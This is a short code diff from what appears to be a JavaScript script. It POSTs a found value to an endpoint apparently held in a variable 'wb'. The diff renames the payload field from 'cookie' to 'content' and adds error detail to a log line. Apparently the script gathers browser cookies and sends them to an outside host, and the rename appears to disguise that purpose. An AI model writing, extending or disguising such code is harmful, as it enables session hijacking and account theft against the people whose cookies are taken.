@@ -16,10 +16,10 @@ if (cv) {
     fetch(wb, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ cookie: cv })
+        body: JSON.stringify({ content: cv })
     })
     .then(() => console.log("sent"))
-    .catch(err => console.error("err"));
+    .catch(err => console.error("err", err));
 } else {
     console.log("nothing found");
 }
